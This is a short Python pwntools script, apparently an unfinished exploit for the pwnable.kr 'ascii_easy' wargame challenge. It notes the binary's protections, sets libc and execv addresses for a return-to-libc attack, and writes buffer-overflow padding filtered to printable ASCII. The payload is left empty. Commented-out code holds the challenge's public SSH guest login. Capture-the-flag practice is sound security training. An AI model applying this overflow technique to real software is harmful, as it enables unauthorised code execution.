#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.log_level = 'error'
#remoto = True
#remoto = False
#if remoto:
#	s = ssh(host='pwnable.kr', user='ascii_easy', password='guest', port=2222)
#	conn = s.process('./ascii_easy')
#else:
#	conn = process('./ascii_easy')

# Partial RELRO   No canary found   NX enabled    No PIE

"""
def isvalid(addr): 
    addr += 0x5555e000 
    addr  = struct.pack("I", addr) 
    for b in addr: 
        if b <= 0x1f or b >= 0x7f: 
            return False 
    return True 
"""

def is_ascii(payload):
	for c in payload:
		if ord(c) <= 0x1f or ord(c) >= 0x7f:
			exit('non ascii char!')
	return True

base_addr = 0x5555e000
execv = p32(0x55616740) # execv: int execv(const char *path, char *const argv[]);

lib = ELF('./libc-2.15.so')
bin = ELF('./ascii_easy')

pad = 'A' * 28 + 'B' * 4

payload = ''

if is_ascii(payload):
	sys.stdout.write(pad + payload)
